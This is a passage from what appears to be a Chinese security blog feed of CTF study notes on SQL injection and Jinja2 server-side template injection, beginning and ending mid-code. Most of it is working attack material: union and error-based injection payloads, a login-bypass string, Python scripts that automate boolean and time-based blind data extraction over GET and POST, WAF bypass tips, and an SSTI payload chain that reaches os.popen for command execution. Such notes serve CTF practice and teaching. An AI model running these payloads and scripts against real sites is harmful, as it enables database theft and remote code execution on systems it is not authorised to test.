class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        right = mid</span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = <span class="built_in">chr</span>(mid - <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(table) <span class="comment">#打印出来的最后一个字符才是表中的字符</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>注意注意!!!</strong><br>盲注这个方法不知道是因为我的题目环境原因还是因为mysql本身的原因,表中的有些字符是无法进行大小的比较的,所有也就无法成功盲注出结果<br>比如坑死我的<code>admin_pass</code>,<code>_</code>字符无法进行比较,所以跑不出来<code>_</code>,暂时还不知道怎么解决,可能这种情况就不适用与盲注</p>
</li>
</ol>
<h2 id="超大数据包post绕过"><a href="#超大数据包post绕过" class="headerlink" title="超大数据包post绕过"></a>超大数据包post绕过</h2><p>有些waf只检查前面的n个字符,这时候我们可以在查询语句中插入一个超大的无用数据,并用<code>/* */</code>注释掉,注意,这种方式只适用于post传参,如果不确定需要多少字符才能绕过waf,也可以写个python脚本跑一下</p>
<h2 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a>分块传输绕过</h2><p>bp下载一个插件<img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230402222253.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>sqli-labs</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入的学习</title>
    <url>/2023/03/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ol>
<li><p><strong>什么是sql注入</strong>:<br>所谓的sql注入就是通过构造“恶意”的代码,让服务器把提交的数据当做sql语句进行执行,从而查询到想要的信息</p>
</li>
<li><p><strong>注入的分类</strong><br>注入大致可以分为<br>按照查询字段  1.<strong>字符型</strong>   2.<strong>数字型(整形)</strong><br>按照注入方法  1.<strong>Union注入</strong>  2.<strong>报错注入</strong>  3.<strong>布尔盲注</strong>  4.<strong>时间盲注</strong></p>
</li>
<li><p><strong>什么是注入点</strong><br>注入点就是数据库连接访问的地方,例如URL栏,或是页面提供的表单等<br>如果这个地方会把用户输入的数据误解成SQL语法,则认为这个地方是注入点<br>例如:输入<code>&#39;</code>判断是否存在注入点,报错则说明把<code>&#39;</code>当成代码,存在注入点</p>
</li>
<li><p><strong>闭合</strong></p>
<ol>
<li><strong>闭合符</strong><br><code>&#39;</code>  <code>&quot;</code>  <code>&#39;)</code>  <code>&quot;)</code>等</li>
<li><strong>闭合方式判断</strong><br>在语句上加入闭合符,如果页面产生错误,再加上注释符(<code>--+</code>,<code>#</code>,<code>%23</code>)页面又恢复正常,则证明这是该语句的闭合符</li>
<li><strong>闭合的作用</strong><br>手工闭合前一段查询语句,后面加入其他语句,查询需要的参数,不需要的语句可以用注释符注释</li>
</ol>
</li>
</ol>
<h1 id="GET提交注入"><a href="#GET提交注入" class="headerlink" title="GET提交注入"></a>GET提交注入</h1><h2 id="字符型与整数型注入的判断"><a href="#字符型与整数型注入的判断" class="headerlink" title="字符型与整数型注入的判断"></a>字符型与整数型注入的判断</h2><p><strong>原理</strong>:字符型需要闭合,两端会有闭合符单引号<code>&#39;&#39;</code>,而数字型不需要闭合符,两种不同类型会把输入的数字与符号理解成不同含义</p>
<ol>
<li><code>and 1=1</code>和<code>and 1=2</code><br>如果是数字型,<code>and 1=2</code>时,逻辑错误,页面报错(或无回显),而如果为字符类型,and不会被解析成逻辑判断,只读取第一个字符,不会报错</li>
<li><strong>减法2-1</strong><br>原理: 有回显的情况下,如果是整数型则会做减法,返回2-1的结果1,如果是字符型只会读取第一个字符2</li>
</ol>
<h2 id="列数的判断"><a href="#列数的判断" class="headerlink" title="列数的判断"></a>列数的判断</h2><p>可以利用<code>group by 列数</code>或<code>order by 列数</code>,如果找不到对应列数就会报错,利用二分法快速判断总列数</p>
<h2 id="Union查询"><a href="#Union查询" class="headerlink" title="Union查询"></a>Union查询</h2><ol start="0">
<li><p><strong>联合查询特性</strong><br>union查询会临时打印一张虚拟的表,会将新创建的虚拟表中的数据也加入数据库,有时可以根据这个特性,将账号密码加入数据库,然后登入<br>可以在不知道密码的情况下绕过密码登入<br>例如<code>name=1&#39;union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123</code>  ps:密码常用md5的方式加密</p>
</li>
<li><p><strong>原理</strong><br>利用Union查询,闭合前一句查询语句,然后可以在原本的查询语句后面加入想要的查询语句,但由于Union联合查询的前提 必须有回显,必须列数与类型一致.</p>
</li>
<li><p><strong>改变回显位置</strong><br>有时页面只能显示一个内容,第二句内容不显示,可以把原本的第一句内容改为数据库不存在的数据(如<code>id=-1</code>),从而使页面回显想要的内容</p>
</li>
<li><p><strong>关键数据库</strong><br><code>information_schema</code>这个数据库里有两张关键的数据表</p>
<ol>
<li><code>tables</code>  是所有表名的集合<br>  tables里的<code>table_name</code>字段储存的是表名,<code>table_schema</code>字段储存的是表所在的数据库</li>
<li><code>columns</code>  是所有字段的集合<br>  columns里的<code>column_name</code>字段储存的是字段名</li>
</ol>
</li>
<li><p><strong>group_concat()</strong><br>确保所有的信息能放在一行显示出来,但是有时显示位不够时,group_concat()可能会显示不全,这时候建议使用limit分页查询</p>
</li>
<li><p><strong>爆破当前数据库名</strong></p>
<ol>
<li><strong>查询当前数据库</strong><br><code>union select database()</code>  无限定条件</li>
<li><strong>查询所有数据库</strong><br><code>union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</code><br>注意:有些时候flag会放在别的数据库</li>
</ol>
</li>
<li><p><strong>爆破表名</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
<p>–限定条件一个,为当前所在的库</p>
</li>
<li><p><strong>爆破字段名</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;上一步爆破出来的表名&#x27;</span> </span><br></pre></td></tr></table></figure>
<p>–限定条件两个,1.为当前所在的库,2.上一步爆破出的表名<br>–更新,似乎不要第一个条件也可以,这样可以省略中间的and</p>
</li>
<li><p><strong>获取数据</strong><br><code>union select group_concat(爆破字段1,爆破字段2) from 爆破出来的表名</code></p>
</li>
</ol>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ol>
<li><p><strong>原理</strong><br>前段页面不区别的直接将输入内容拼接成SQL语句,后端执行后也无差别的将结果显示到页面上.<br>构造语句,让错误信息中夹杂可以查询数据内容的查询语句,让返回的错误提示中包含数据库的内容.适用于无回显有报错的情况</p>
</li>
<li><p><strong>extractvalue报错</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">100</span>,concat(<span class="number">0x7e</span>,(查询内容)))</span><br></pre></td></tr></table></figure>
<ol>
<li>原理:<br> <code>extractvalue()</code>函数的报错是会把报错地址回显出来,利用在extractvalue地址语句中插入sql查询语句,让报错提示把想要的信息回显,<code>(查询语句)</code>中写入对应的查询语句即可</li>
<li>注意:<br> 100的位置可以随意写,只要不存在的列名会报错即可,<code>concat(参数1,参数2)</code>的作用是将逗号两边的内容拼接起来,而<code>0x7e</code>代表的是字符<code>~</code>,这是extractvalue回显的关键</li>
<li><code>substring(参数1,参数2,参数3)</code>控制输出 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">100</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">substring</span>( group_concat(爆破字段<span class="number">1</span>,爆破字段<span class="number">2</span>),<span class="number">1</span>,<span class="number">30</span>)<span class="keyword">from</span> 爆破出的表名 )))</span><br></pre></td></tr></table></figure>
 使用原因:extractvalue报错注入默认只能返回三十二个字符,有时无法获取整个数据<br> 用法:参数1是需要查看的数据,参数2是从第几个字符开始看,参数3是看几个字符<br> 当然,这边也可以使用limit,不使用subtring+group_concat <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">100</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span> )))</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>updatexml报错</strong></p>
<ol>
<li><code>updatexml(1,concat(0x7e,(查询内容)),3)</code><br>updatexml在报错注入方面和extractvalue几乎没有差别,只是地址参数变成了第二个,</li>
</ol>
</li>
<li><p><strong>floor报错</strong><br>暂略</p>
</li>
</ol>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
<li><strong>原理</strong> :适用于页面无回显也无报错,但是页面有真假的区别的情况</li>
<li><strong>基本格式</strong><br><code>and ascii (substr((查询语句),1,1))&gt;100 --+</code></li>
<li><code>ascii()</code><br>通过ascii()将查询的数据转为ascii码判断真假,为真,最后结果为1,为假,最后结果为0</li>
<li><code>substring(参数1,参数2,参数3)</code>控制输出<br>参数1是需要查看的数据,参数2是从第几个字符开始看(从一开始每次加一),参数3是看几个字符(每次一个)</li>
<li><strong>二分法脚本</strong>:<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;查询网址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>    <span class="comment">#储存数据</span></span><br><span class="line">flag =<span class="string">&quot;真值条件&quot;</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span>   <span class="comment">#闭合方式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">        payload = <span class="string">f&quot;and ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">        new_url = url +bihe+ payload</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=new_url).text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table= table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br><span class="line">    <span class="comment">#time.sleep(0.5)</span></span><br></pre></td></tr></table></figure>
注意点:<code>二分法(&lt;,&gt;,+1)</code>, <code>mid = (left + right) // 2</code>要写两个,其中一个在最后<br><strong>另一种写法的二分法</strong><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left=<span class="number">31</span></span><br><span class="line">    right=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        pyload=<span class="string">f&quot;and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=url+bihe+pyload).text:</span><br><span class="line">            left=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> left==right:</span><br><span class="line">            table += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line"><span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><ol>
<li><strong>原理</strong>:<br>适用于页面有注入点,可以把输入内容当做代码执行,但是既没有回显也无报错,甚至无法区别真假。这是可以利用<code>sleep()</code>函数测试,如果页面出现延迟,则说明存在注入点</li>
<li><strong>关键函数</strong><code>if(参数1,参数2,参数3)</code><br>这是SQL的if语法,参数1作为判断,若为真,则返回参数2,若为假,则返回参数三</li>
<li><strong>基本格式</strong><br><code>and if(ascii (substr((查询语句),1,1))&gt;100,sleep(2),0)--+</code></li>
<li><strong>时间盲注脚本</strong><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;查询地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>    <span class="comment">#储存数据</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span>   <span class="comment">#闭合方式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">        payload = <span class="string">f&quot;and if(ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)--+&quot;</span></span><br><span class="line">        new_url = url +bihe+ payload</span><br><span class="line">        start=time.time()</span><br><span class="line">        requests.get(url=new_url)</span><br><span class="line">        end=time.time()</span><br><span class="line">        <span class="keyword">if</span> end-start&gt;=<span class="number">2</span>:  <span class="comment">#注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table= table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure>
<strong>注意</strong>:基本框架和布尔盲注类似,只要将布尔盲注的真值判断改为时间差即可(当然sql语句也要改),但脚本请求有基本的延迟,需要先判断基本延迟,如果特别卡可以把<code>sleep()</code>的时间改小一点<br><strong>延迟判断</strong><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start=time.time()</span><br><span class="line">requests.get(url=new_url)</span><br><span class="line">end=time.time()</span><br></pre></td></tr></table></figure>
在这段语句后面加上一个<code>print(end-start)</code>即可,会不断跳出来数字,偏大的即为成功执行sleep</li>
</ol>
<h2 id="文件上传注入"><a href="#文件上传注入" class="headerlink" title="文件上传注入"></a>文件上传注入</h2><p>暂略</p>
<h2 id="and和or"><a href="#and和or" class="headerlink" title="and和or"></a>and和or</h2><pre><code>如果要实现布尔盲注(需要页面有真假值的反馈),如果使用and,必须保证前半段语句是正确的,如果使用or,则必须保证前半段语句是错误的
</code></pre>
<h1 id="POST提交注入"><a href="#POST提交注入" class="headerlink" title="POST提交注入"></a>POST提交注入</h1><p>post提交和get提交的主要区别就是,post提交相对get提交更安全一些,一般的表单等密码输入都是采用post提交</p>
<h2 id="post提交的闭合判断"><a href="#post提交的闭合判断" class="headerlink" title="post提交的闭合判断"></a>post提交的闭合判断</h2><p>若输入闭合符导致页面报错(或不显示),加上<code>or 1=1 #</code>后可以成功登入,则说明存在注入点,且闭合符为输入闭合符</p>
<h2 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h2><ol>
<li><strong>原理</strong><br>post提交在手动注入上和get没有什么区别,但是在python脚本里,get提交是利用字符串的拼接来实现对网址的传参,而post提交则要利用字典</li>
<li><strong>二分法脚本</strong><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: <span class="string">f&quot;1&#x27; or if(ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0) #&quot;</span>,  <span class="comment">#post要提交的数据</span></span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        requests.post(url=url,data=date)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt;=<span class="number">2</span>:  <span class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
<li><strong>判断条件</strong><br>如果条件是以图片的形式显示的,需要写成<code>相对路径.jpg</code>,例如<code>../images/flag.jpg</code>(两个小数点<code>..</code>表示上一个目录)</li>
<li><strong>二分法脚本</strong><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line">flag=<span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="comment">#真值条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: <span class="string">f&quot;1&#x27; or ascii (substr((查询条件),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> #&quot;</span>,  <span class="comment"># post要提交的数据</span></span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.post(url=url, data=date).text: <span class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br><span class="line">    <span class="comment">#time.sleep(0.5)</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="头文件注入"><a href="#头文件注入" class="headerlink" title="头文件注入"></a>头文件注入</h1><ol>
<li>如果网站记录了浏览信息或者是IP信息之类,就有可能存在头注入</li>
<li>有些网站可能需要登入进之后才能进行头注入</li>
<li>需要注意闭合和列数要保持一致</li>
<li>本质上几种不同的头文件注入没有区别</li>
<li>可以利用hackbar,也可以用抓包软件burpsuite进行请求头的修改<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230330204747.png" alt="请求头"></li>
</ol>
<h1 id="注入编码"><a href="#注入编码" class="headerlink" title="注入编码"></a>注入编码</h1><p>有时候网站会对<code>cookie</code>或其他的一些注入点进行编码,这时候需要把我们的查询语句编码后再放入指定位置,但注释符也可能无法成功编码,这时候可以利用<code>and &#39;1&#39;=&#39;1</code>类似这样的语句产生注释效果</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>sqli-labs</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI注入的学习</title>
    <url>/2023/05/09/SSTI%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="SSTI简介"><a href="#SSTI简介" class="headerlink" title="SSTI简介"></a>SSTI简介</h1><p>SSTI 是服务器端模板注入（Server-Side Template Injection）的缩写。它实际上也是一种注入漏洞，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的。</p>
<p>不同的语言下有不同的框架,不同的框架又有不同模板,不同的语言模板对应的注入点和闭合可能略有区别,但本质原理都是一样的,就是将用户输入的数据不加处理就添加在了前端页面上,然后再用模板渲染时,就有可能把用户输入的数据当成本身的语法(和SQL注入一样的),从而导致安全问题</p>
<p>使用模板可以让静态的html页面动态的展示内容,模板是一个响应文本的文件,其中占位符(变量)表示动态部分,告诉模板引擎具体的值需要从使用的数据中获取.使用真实值替换变量,在返回最终得到的字符串,这个程称为渲染</p>
<p>如果先将前端页面渲染,再将用户输入的数据添加在页面上,这样模板已经固定,就不会产生ssti的漏洞了(感觉和SQL的预处理又有点像)</p>
<p>有一个经典的图可以简单的判断是属于的哪一个模板<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/68747470733a2f2f692e696d6775722e636f6d2f47565a655671362e706e67.png"><br>红色箭头代表<code>内容</code>未被当做命令执行,绿色代表成功当做命令执行</p>
<h1 id="Flask框架下的ssti"><a href="#Flask框架下的ssti" class="headerlink" title="Flask框架下的ssti"></a>Flask框架下的ssti</h1><ol>
<li><p><strong>什么是Flask</strong><br>Flask是一个用python编写的轻量级web应用框架,默认使用的是jinja2模板引擎,python可以利用flask框架简单直接的启动一个web服务页面</p>
</li>
<li><p><strong>flask的变量</strong><br><code>&#123;&#123; ... &#125;&#125;</code>：装载一个变量，模板渲染时，会使用传进来的通命名参数将代表的值替换<br><code>&#123;% ... %&#125;</code>：装载一个控制语句<br><code>\&#123;\# ... \#\&#125;</code>：装载一个注释，模板渲染的时候会忽视这个值</p>
</li>
<li><p><strong>造成危险的函数</strong><br>使用jinja2模板有两种渲染方式<code>render_template()</code>和<code>render_template_string()</code><br><code>render_template()</code>是渲染文件的，<code>render_template_string()</code>是渲染字符串的<br>主要会造成ssti漏洞的是<code>render_template_string()</code>,如果传入参数是通过<code>%s</code>的形式获取而非变量取值语句的形式获取,例如,下面的一段代码会存在ssti</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name= request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">template = <span class="string">&#x27;&lt;h1&gt;Hello %s!&lt;/h1&gt;&#x27;</span> % name</span><br><span class="line"><span class="keyword">return</span> render_template_string(template, name=name)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="jinja2中的ssti"><a href="#jinja2中的ssti" class="headerlink" title="jinja2中的ssti"></a>jinja2中的ssti</h2><p>在python的jinja2模板引擎中,有许多魔术方法,可以帮我们实现在各个类中的跳转,所有类的最终的父类都是<code>object</code>,也就是说,我们只要任意使用一个类型(比如字符型<code>&#39;&#39;</code>),然后向上找父类,最后就可以通过<code>object</code>到达任意子类<br><strong>流程</strong><br>我们需要找到一个危险类,这个类中有可以执行系统命令的危险函数,我们最终通过这个危险函数来实现命令执行<br>常见危险类<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230513175211.png"></p>
<h3 id="相关魔术方法"><a href="#相关魔术方法" class="headerlink" title="相关魔术方法"></a>相关魔术方法</h3><ol>
<li><p><code>__class__</code><br>查找当前类型的所属对象</p>
</li>
<li><p><code>__base__</code><br>找到当前类的上一层父类</p>
</li>
<li><p><code>__mro__[]</code><br>查找当前类的所有继承类,用<code>[]</code>可以指定某一个父类<br>如<code>__mro__[1]</code>和<code>__base__</code>是一样的</p>
</li>
<li><p><code>__subclasses__()[]</code><br>查找当前类的所有子类,用<code>[]</code>可以指定某一个子类</p>
</li>
<li><p><code>__init__</code><br>查看类是否重载,重载是值在程序运行时就已经加载好了这个模块到内存中,如果出现<code>wrapper</code>字眼,说明没有重载</p>
</li>
<li><p><code>__globals__</code><br>寻找当前类所有的方法及变量及参数,以字典的形式输出</p>
</li>
<li><p><code>__builtins__</code><br>是一个内置模块，它包含了 Python 中所有内置的函数和变量。这意味着你可以直接使用这些函数和变量，而不需要导入任何模块<br>例如，如果你在一个模块中定义了一个与内置函数同名的函数，但仍然需要使用内置函数，那么你可以通过访问 <code>__builtins__</code>模块来实现。<br>可以利用这个模块来调用<code>eval()</code>函数,再用<code>eval()</code>函数执行任意命令</p>
</li>
</ol>
<h3 id="危险函数的利用"><a href="#危险函数的利用" class="headerlink" title="危险函数的利用"></a>危险函数的利用</h3><ol>
<li><p><strong>popen</strong><br><code>popen</code>是<code>os</code>模块中的一个函数,可以实现系统命令执行,但是没有回显,要加上<code>.read()</code>才能回显<br><strong>payload:</strong> <code>__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></p>
</li>
<li><p><strong>eval</strong><br>通过<code>__builtins__</code>模块可以调用<code>eval</code>函数,从而实现任意代码执行<br><strong>payload:</strong><br><code>&#123;&#123;().__class__.__base__.__subclasses__()[编号].__init__['__glo'+'bals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')&#125;&#125;</code></p>
</li>
</ol>
<h3 id="脚本找危险类"><a href="#脚本找危险类" class="headerlink" title="脚本找危险类"></a>脚本找危险类</h3><p>使用脚本可以快速的定位到某个类对应的编号,<code>__subclasses__()[]</code>将编号写入<code>[]</code>内,就可以定位到指定的类中<br><strong>POST传参:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;网址&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;需要查询的类&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;search&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    response=requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>

<p><strong>GET传参:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;网址&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;需要查询的类&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    payload=<span class="string">&quot;?search=&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    newurl=url+payload</span><br><span class="line">    response=requests.get(url=newurl)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> 